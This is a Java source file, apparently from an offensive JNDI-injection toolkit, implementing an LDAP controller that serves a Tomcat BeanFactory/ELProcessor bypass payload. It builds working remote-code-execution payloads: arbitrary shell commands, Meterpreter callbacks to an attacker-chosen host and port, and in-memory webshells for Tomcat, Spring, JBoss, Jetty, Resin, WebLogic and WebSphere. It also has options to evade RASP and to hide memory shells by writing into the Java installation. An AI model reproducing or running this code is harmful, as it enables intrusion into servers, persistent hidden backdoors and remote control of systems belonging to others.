package com.qi4l.jndi.controllers;

import com.qi4l.jndi.enumtypes.GadgetType;
import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.exceptions.IncorrectParamsException;
import com.qi4l.jndi.exceptions.UnSupportedGadgetTypeException;
import com.qi4l.jndi.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.jndi.gadgets.utils.InjShell;
import com.qi4l.jndi.template.*;
import com.qi4l.jndi.template.Agent.WinMenshell;
import com.qi4l.jndi.template.memshell.BypassNginxCDN.cmsMSBYNC;
import com.qi4l.jndi.template.memshell.BypassNginxCDN.proxyMSBYNC;
import com.qi4l.jndi.template.memshell.Tomcat_Spring_Jetty.MsTSJproxy;
import com.qi4l.jndi.template.memshell.Tomcat_Spring_Jetty.MsTSJser;
import com.qi4l.jndi.template.memshell.Websphere.WSFMSFromThread;
import com.qi4l.jndi.template.memshell.Websphere.WSWebsphereProxy;
import com.qi4l.jndi.template.memshell.Websphere.websphereEcho;
import com.qi4l.jndi.template.echo.*;
import com.qi4l.jndi.template.memshell.jboss.JBFMSFromContextF;
import com.qi4l.jndi.template.memshell.jboss.JBSMSFromContextS;
import com.qi4l.jndi.template.echo.JbossEcho;
import com.qi4l.jndi.template.memshell.jetty.JFMSFromJMXF;
import com.qi4l.jndi.template.memshell.jetty.JSMSFromJMXS;
import com.qi4l.jndi.template.echo.jettyEcho;
import com.qi4l.jndi.template.memshell.resin.RFMSFromThreadF;
import com.qi4l.jndi.template.memshell.resin.RSMSFromThreadS;
import com.qi4l.jndi.template.echo.resinEcho;
import com.qi4l.jndi.template.memshell.resin.WsResin;
import com.qi4l.jndi.template.memshell.spring.SpringControllerMS;
import com.qi4l.jndi.template.memshell.spring.SpringInterceptorMS;
import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.gadgets.utils.Util;
import com.qi4l.jndi.template.echo.weblogicEcho;
import com.qi4l.jndi.gadgets.utils.ClassNameUtils;
import com.qi4l.jndi.gadgets.utils.HexUtils;
import com.qi4l.jndi.template.memshell.struts2.Struts2ActionMS;
import com.qi4l.jndi.template.memshell.tomcat.*;
import com.qi4l.jndi.template.memshell.weblogic.WsWeblogic;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;
import org.apache.commons.codec.binary.Base64;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import java.io.IOException;
import java.lang.reflect.Field;

import static org.fusesource.jansi.Ansi.ansi;


@LdapMapping(uri = {"/tomcatbypass"})
public class TomcatBypassController implements LdapController {
    private PayloadType payloadType;
    private String[]    params;
    private GadgetType  gadgetType;

    public static CommandLine cmdLine;

    /**
     * 发送LDAP ResourceRef结果和重定向URL
     *
     * @param result InMemoryInterceptedSearchResult类型的结果
     * @param base   基本远程参考负载字符串
     * @throws Exception 异常
     */
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            System.out.println(ansi().render("@|green [+]|@ Sending LDAP ResourceRef result for" + base + "  with javax.el.ELProcessor payload"));
            Entry e = new Entry(base);
            e.addAttribute("javaClassName", "java.lang.String"); //could be any
            //准备在 org.apache.naming.factory.BeanFactory 中利用不安全反射的负载
            //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "x=eval"));

            TomcatBypassHelper helper = new TomcatBypassHelper();
            String             code   = null;


            //具体分化在这里
            switch (payloadType) {
                case command:
                    code = helper.getExecCode(params[0]);
                    break;
                case tomcatecho:
                    code = helper.injectTomcatEcho();
                    break;
                case springecho:
                    code = helper.injectSpringEcho();
                    break;
                case weblogicecho:
                    code = helper.injectWeblogicEcho();
                    break;
                case websphereecho:
                    code = helper.injectWebsphereEcho();
                    break;
                case resinecho:
                    code = helper.injectResinEcho();
                    break;
                case windowsecho:
                    code = helper.injectWindowsEcho();
                    break;
                case linuxecho1:
                    code = helper.injectLinuxEcho1();
                    break;
                case linuxecho2:
                    code = helper.injectLinuxEcho2();
                    break;
                case jettyecho:
                    code = helper.injectJettyEcho();
                    break;
                case issuccess:
                    code = helper.injectSuccess();
                    break;
                case meterpreter:
                    code = helper.injectMeterpreter();
                    break;
                case tomcatfilterjmx:
                    code = helper.injectTomcatFilterJmx();
                    break;
                case tomcatfilterth:
                    code = helper.injectTomcatFilterTh();
                    break;
                case tomcatlistenerjmx:
                    code = helper.injectTomcatListenerJmx();
                    break;
                case struts2actionms:
                    code = helper.injectStruts2ActionMS();
                    break;
                case tomcatlistenerth:
                    code = helper.injectTomcatListenerTh();
                    break;
                case tomcatservletjmx:
                    code = helper.injectTomcatServletJmx();
                    break;
                case tomcatservletth:
                    code = helper.injectTomcatServletTh();
                    break;
                case jbossfilter:
                    code = helper.injectJBossFilter();
                    break;
                case jbossservlet:
                    code = helper.injectJBossServlet();
                    break;
                case springinterceptor:
                    code = helper.injectSpringInterceptor();
                    break;
                case springcontroller:
                    code = helper.injectSpringControllerMS();
                    break;
                case wsfilter:
                    code = helper.injectWSFilter();
                    break;
                case jettyfilter:
                    code = helper.injectJettyFilter();
                    break;
                case jettyservlet:
                    code = helper.injectJettyServlet();
                    break;
                case tomcatexecutor:
                    code = helper.injectTomcatExecutor();
                    break;
                case resinfilterth:
                    code = helper.injectResinFilterTh();
                    break;
                case resinservletth:
                    code = helper.injectResinServletTh();
                    break;
                case tomcatupgrade:
                    code = helper.injectTomcatUpgrade();
                    break;
                case jbossecho:
                    code = helper.injectJbossEcho();
                    break;
                case allecho:
                    code = helper.injectAllEcho();
                    break;
                case cmsmsbync:
                    code = helper.injectcmsMSBYNC();
                    break;
                case proxymsbync:
                    code = helper.injectproxyMSBYNC();
                    break;
                case wsresin:
                    code = helper.injectWsResin();
                    break;
                case mstsjser:
                    code = helper.injectMsTSJser();
                    break;
                case mstsjproxy:
                    code = helper.injectMsTSJproxy();
                    break;
                case wsweblogic:
                    code = helper.injectWsWeblogic();
                    break;
                case wswebsphereproxy:
                    code = helper.injectWSWebsphereProxy();
                    break;
            }
            String payloadTemplate = "{" +
                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                    ".newInstance().getEngineByName(\"JavaScript\")" +
                    ".eval(\"{replacement}\")" +
                    "}";
            String finalPayload = payloadTemplate.replace("{replacement}", code);
            ref.add(new StringRefAddr("x", finalPayload));
            e.addAttribute("javaSerializedData", Util.serialize(ref));
            // 将条目发送至结果中，并将结果设置为成功
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    /**
     * 处理传入的参数 base
     *
     * @param base 传入的参数
     * @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
     * @throws IncorrectParamsException        错误的参数异常
     * @throws UnSupportedGadgetTypeException  不支持的 Gadget 类型异常
     */
    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try {
            base = base.replace('\\', '/');
            // 获取第一个斜杠的索引
            int fistIndex = base.indexOf("/");
            // 获取第二个斜杠的索引
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                // 将类型值设为从第二个斜杠后的字符串到第三个斜杠前（不包括第三个斜杠）所表示的字符串转换为 PayloadType 枚举类型
                payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
                System.out.println(ansi().render("@|green [+]|@ PaylaodType >> " + payloadType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
            }
            // 将类型值设为从第三个斜杠后的字符串到第四个斜杠前（不包括第三个斜杠）所表示的字符串转换为 PayloadType 枚举类型
            int thirdIndex = base.indexOf("/", secondIndex + 1);
            // 如果为空则进入下面逻辑
            if (thirdIndex != -1) {
                if (thirdIndex < 0) thirdIndex = base.length();
                try {
                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                }
            }

            if (gadgetType == GadgetType.shell) {
                String   arg     = Util.getCmdFromBase(base);
                String[] args    = arg.split(" ");
                Options  options = new Options();
                options.addOption("t", "Type", false, "选择内存马的类型");
                options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
                options.addOption("o", "obscure", false, "使用反射绕过");
                options.addOption("w", "winAgent", false, "Windows下使用Agent写入");
                options.addOption("l", "linAgent", false, "Linux下使用Agent写入");
                options.addOption("u", "url", true, "内存马绑定的路径,default [/version.txt]");
                options.addOption("pw", "password", true, "内存马的密码,default [p@ssw0rd]");
                options.addOption("r", "referer", true, "内存马 Referer check,default [https://nu1r.cn/]");
                options.addOption("h", "hide-mem-shell", false, "通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持SpringControllerMS");
                options.addOption("ht", "hide-type", true, "隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/");

                CommandLineParser parser = new DefaultParser();

                try {
                    cmdLine = parser.parse(options, args);
                } catch (Exception e) {
                    System.out.println("[*] Parameter input error, please use -h for more information");
                }

                if (cmdLine.hasOption("Type")) {
                    Config.Shell_Type = cmdLine.getOptionValue("Type");
                    //System.out.println("内存shell >>" + Shell_Type);
                }

                if (cmdLine.hasOption("winAgent")) {
                    Config.winAgent = true;
                    System.out.println(ansi().render("@|green [+]|@Windows下使用Agent写入"));
                }

                if (cmdLine.hasOption("linAgent")) {
                    Config.winAgent = true;
                    System.out.println(ansi().render("@|green [+]|@Linux下使用Agent写入"));
                }

                if (cmdLine.hasOption("obscure")) {
                    Config.IS_OBSCURE = true;
                    System.out.println(ansi().render("@|green [+]|@使用反射绕过RASP"));
                }

                if (cmdLine.hasOption("url")) {
                    String url = cmdLine.getOptionValue("url");
                    if (!url.startsWith("/")) {
                        url = "/" + url;
                    }
                    Config.URL_PATTERN = url;
                    System.out.println("[+] Path：" + Config.URL_PATTERN);
                }

                if (cmdLine.hasOption("password")) {
                    Config.PASSWORD = HexUtils.generatePassword(cmdLine.getOptionValue("password"));
                    System.out.println("[+] Password：" + Config.PASSWORD);
                }

                if (cmdLine.hasOption("referer")) {
                    Config.HEADER_KEY = cmdLine.getOptionValue("referer");
                    System.out.println("[+] referer：" + Config.HEADER_KEY);
                }

                if (cmdLine.hasOption("AbstractTranslet")) {
                    Config.IS_INHERIT_ABSTRACT_TRANSLET = true;
                    System.out.println("[+] 继承恶意类AbstractTranslet");
                }

                if (cmdLine.hasOption("hide-mem-shell")) {
                    Config.HIDE_MEMORY_SHELL = true;

                    if (cmdLine.hasOption("hide-type")) {
                        Config.HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
                    }
                }
            }

            if (gadgetType == GadgetType.base64) {
                String cmd = Util.getCmdFromBase(base);
                System.out.println(ansi().render("@|green [+]|@ Command >>" + cmd));
                params = new String[]{cmd};
            }
            if (gadgetType == GadgetType.msf) {
                String[] results1 = Util.getIPAndPortFromBase(base);
                Config.rhost = results1[0];
                Config.rport = results1[1];
                System.out.println("[+] RemotHost: " + results1[0]);
                System.out.println("[+] RemotPort: " + results1[1]);
                params = results1;
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    private class TomcatBypassHelper {

        public String getExecCode(String cmd) throws IOException {

            String code = "var strs=new Array(3);\n" +
                    "        if(java.io.File.separator.equals('/')){\n" +
                    "            strs[0]='/bin/bash';\n" +
                    "            strs[1]='-c';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }else{\n" +
                    "            strs[0]='cmd';\n" +
                    "            strs[1]='/C';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }\n" +
                    "        java.lang.Runtime.getRuntime().exec(strs);";

            return code;
        }

        public String injectTomcatEcho() {
            return InjShell.injectClass(TomcatEcho.class);
        }

        public String injectJbossEcho() {
            return InjShell.injectClass(JbossEcho.class);
        }

        public String injectResinEcho() {
            return InjShell.injectClass(resinEcho.class);
        }

        public String injectSpringEcho() {
            return InjShell.injectClass(SpringEcho.class);
        }

        public String injectWeblogicEcho() {
            return InjShell.injectClass(weblogicEcho.class);
        }

        public String injectWebsphereEcho() {
            return InjShell.injectClass(websphereEcho.class);
        }

        public String injectWindowsEcho() {
            return InjShell.injectClass(WindowsEcho.class);
        }

        public String injectLinuxEcho1() {
            return InjShell.injectClass(LinuxEcho1.class);
        }

        public String injectLinuxEcho2() {
            return InjShell.injectClass(LinuxEcho2.class);
        }

        public String injectJettyEcho() {
            return InjShell.injectClass(jettyEcho.class);
        }

        public String injectAllEcho() {
            return InjShell.injectClass(AllEcho.class);
        }

        public String injectcmsMSBYNC() {
            return InjShell.injectClass(cmsMSBYNC.class);
        }

        public String injectproxyMSBYNC() {
            return InjShell.injectClass(proxyMSBYNC.class);
        }

        public String injectWsResin() {
            return InjShell.injectClass(WsResin.class);
        }

        public String injectMsTSJser() {
            return InjShell.injectClass(MsTSJser.class);
        }

        public String injectMsTSJproxy() {
            return InjShell.injectClass(MsTSJproxy.class);
        }

        public String injectWsWeblogic() {
            return InjShell.injectClass(WsWeblogic.class);
        }

        public String injectWSWebsphereProxy() {
            return InjShell.injectClass(WSWebsphereProxy.class);
        }

        public String injectSuccess() {
            return InjShell.injectClass(isSuccess.class);
        }

        //        public String injectMeterpreter(){return injectClass(Meterpreter.class);}
        public String injectMeterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            Class<?> ctClazz      = Class.forName("com.qi4l.jndi.template.Meterpreter");
            Field    WinClassName = ctClazz.getDeclaredField("host");
            WinClassName.setAccessible(true);
            WinClassName.set(ctClazz, params[0]);
            Field WinclassBody = ctClazz.getDeclaredField("port");
            WinclassBody.setAccessible(true);
            WinclassBody.set(ctClazz, params[1]);
            return InjShell.injectClass(ctClazz);
        }

        public String injectTomcatFilterJmx() throws Exception {
            return InjShell.structureShellTom(TSMSFromJMXF.class);
        }

        public String injectTomcatFilterTh() throws Exception {
            return InjShell.structureShellTom(TFMSFromThreadF.class);
        }

        public String injectStruts2ActionMS() throws Exception {
            return InjShell.structureShellTom(Struts2ActionMS.class);
        }

        public String injectTomcatListenerJmx() throws Exception {
            return InjShell.structureShellTom(TLMSFromJMXLi.class);
        }

        public String injectTomcatListenerTh() throws Exception {
            return InjShell.structureShellTom(TFMSFromThreadLi.class);
        }

        public String injectTomcatServletJmx() throws Exception {
            return InjShell.structureShellTom(TSMSFromJMXS.class);
        }

        public String injectTomcatServletTh() throws Exception {
            return InjShell.structureShellTom(TFMSFromThreadS.class);
        }

        public String injectJBossFilter() throws Exception {
            return InjShell.structureShellTom(JBFMSFromContextF.class);
        }

        public String injectJBossServlet() throws Exception {
            return InjShell.structureShellTom(JBSMSFromContextS.class);
        }

        public String injectJettyFilter() throws Exception {
            return InjShell.structureShellTom(JFMSFromJMXF.class);
        }

        public String injectJettyServlet() throws Exception {
            return InjShell.structureShellTom(JSMSFromJMXS.class);
        }

        public String injectWSFilter() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(WSFMSFromThread.class));
            CtClass ctClass = pool.get(WSFMSFromThread.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "ws");
            ctClass.setName(ClassNameUtils.generateClassName());
            if (Config.winAgent) {
                InjShell.TinsertWinAgent(ctClass);
                return InjShell.injectClass(WinMenshell.class);
            }
            if (Config.linAgent) {
                InjShell.TinsertLinAgent(ctClass);
                return InjShell.injectClass(WinMenshell.class);
            }
            if (Config.HIDE_MEMORY_SHELL) {
                switch (Config.HIDE_MEMORY_SHELL_TYPE) {
                    case 1:
                        break;
                    case 2:
                        CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
                        newClass.setName(ClassNameUtils.generateClassName());
                        String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                        String className = "className=\"" + ctClass.getName() + "\";";
                        newClass.defrost();
                        newClass.makeClassInitializer().insertBefore(content);
                        newClass.makeClassInitializer().insertBefore(className);

                        if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
                            Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                            CtClass superClass   = pool.get(abstTranslet.getName());
                            newClass.setSuperclass(superClass);
                        }

                        return InjShell.injectClass(newClass.getClass());
                }
            }

            return InjShell.injectClass(ctClass.getClass());
        }

        public String injectTomcatExecutor() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
            CtClass ctClass = pool.get(TWSMSFromThread.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "execute");
            ctClass.setName(ClassNameUtils.generateClassName());
            if (Config.winAgent) {
                InjShell.TinsertWinAgent(ctClass);
                return InjShell.injectClass(WinMenshell.class);
            }
            if (Config.linAgent) {
                InjShell.TinsertLinAgent(ctClass);
                return InjShell.injectClass(WinMenshell.class);
            }
            if (Config.HIDE_MEMORY_SHELL) {
                switch (Config.HIDE_MEMORY_SHELL_TYPE) {
                    case 1:
                        break;
                    case 2:
                        CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
                        newClass.setName(ClassNameUtils.generateClassName());
                        String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                        String className = "className=\"" + ctClass.getName() + "\";";
                        newClass.defrost();
                        newClass.makeClassInitializer().insertBefore(content);
                        newClass.makeClassInitializer().insertBefore(className);

                        if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
                            Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                            CtClass superClass   = pool.get(abstTranslet.getName());
                            newClass.setSuperclass(superClass);
                        }

                        return InjShell.injectClass(newClass.getClass());
                }
            }

            return InjShell.injectClass(ctClass.getClass());
        }

        public String injectSpringInterceptor() throws Exception {
            return InjShell.structureShellTom(SpringInterceptorMS.class);
        }

        public String injectSpringControllerMS() throws Exception {
            return InjShell.structureShellTom(SpringControllerMS.class);
        }

        public String injectResinFilterTh() throws Exception {
            return InjShell.structureShellTom(RFMSFromThreadF.class);
        }

        public String injectResinServletTh() throws Exception {
            return InjShell.structureShellTom(RSMSFromThreadS.class);
        }

        public String injectTomcatUpgrade() throws Exception {
            Config.init();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
            CtClass ctClass = pool.get(TWSMSFromThread.class.getName());
            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "upgrade");
            ctClass.setName(ClassNameUtils.generateClassName());
            if (Config.winAgent) {
                InjShell.TinsertWinAgent(ctClass);
                return InjShell.injectClass(WinMenshell.class);
            }
            if (Config.linAgent) {
                InjShell.TinsertLinAgent(ctClass);
                return InjShell.injectClass(WinMenshell.class);
            }
            if (Config.HIDE_MEMORY_SHELL) {
                switch (Config.HIDE_MEMORY_SHELL_TYPE) {
                    case 1:
                        break;
                    case 2:
                        CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
                        newClass.setName(ClassNameUtils.generateClassName());
                        String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                        String className = "className=\"" + ctClass.getName() + "\";";
                        newClass.defrost();
                        newClass.makeClassInitializer().insertBefore(content);
                        newClass.makeClassInitializer().insertBefore(className);

                        if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
                            Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                            CtClass superClass   = pool.get(abstTranslet.getName());
                            newClass.setSuperclass(superClass);
                        }

                        return InjShell.injectClass(newClass.getClass());
                }
            }
            return InjShell.injectClass(ctClass.getClass());
        }
    }
}